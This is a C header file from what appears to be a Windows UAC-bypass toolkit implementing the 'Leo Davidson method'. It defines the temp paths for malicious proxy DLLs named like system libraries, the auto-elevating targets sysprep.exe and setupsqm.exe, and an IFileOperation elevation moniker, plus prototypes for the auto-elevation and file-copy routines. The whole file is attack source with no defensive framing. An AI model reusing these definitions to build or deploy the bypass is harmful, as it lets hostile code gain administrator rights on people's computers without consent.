/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       PITOU.H
*
*  VERSION:     1.91
*
*  DATE:        12 Oct 2015
*
*  Prototypes and definitions for Leo Davidson method.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

//
// Standard elevation methods.
//
#define M1W7_SOURCEDLL         L"%temp%\\CRYPTBASE.dll"
#define M1W7_TARGETDIR         L"%systemroot%\\system32\\sysprep\\"
#define M1W7_TARGETPROCESS     L"%systemroot%\\system32\\sysprep\\sysprep.exe"
#define M1W8_SOURCEDLL         L"%temp%\\shcore.dll"
#define M1WALL_SOURCEDLL       L"%temp%\\wdscore.dll"
#define M1W7T_SOURCEDLL        L"%temp%\\ActionQueue.dll"
#define M1W10_SOURCEDLL        L"%temp%\\dbgcore.dll"
#define M1WALL_TARGETDIR       L"%systemroot%\\system32\\oobe\\"
#define M1WALL_TARGETPROCESS   L"%systemroot%\\system32\\oobe\\setupsqm.exe"
#define IFILEOP_ELEMONIKER     L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}"
#define SYSTEMROOTDIR          L"%systemroot%\\system32\\"
#define WBEMDIR                L"%systemroot%\\system32\\wbem"
#define TEMPDIR                L"%temp%\\"

BOOL ucmStandardAutoElevation(
	DWORD dwType,
	CONST PVOID ProxyDll,
	DWORD ProxyDllSize
	);

BOOL ucmAutoElevateCopyFile(
	LPWSTR SourceFileName,
	LPWSTR DestinationDir
	);
